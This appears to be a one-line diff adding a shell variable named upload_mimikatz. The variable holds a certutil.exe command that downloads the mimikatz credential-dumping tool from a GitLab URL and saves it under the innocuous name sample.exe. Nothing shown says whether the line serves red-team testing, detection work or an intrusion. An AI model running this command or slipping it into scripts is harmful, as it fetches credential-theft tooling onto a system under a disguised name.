@@ -1,1 +1,1 @@
-
+upload_mimikatz="certutil.exe -urlcache -f https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimikatz.exe?ref_type=heads sample.exe"
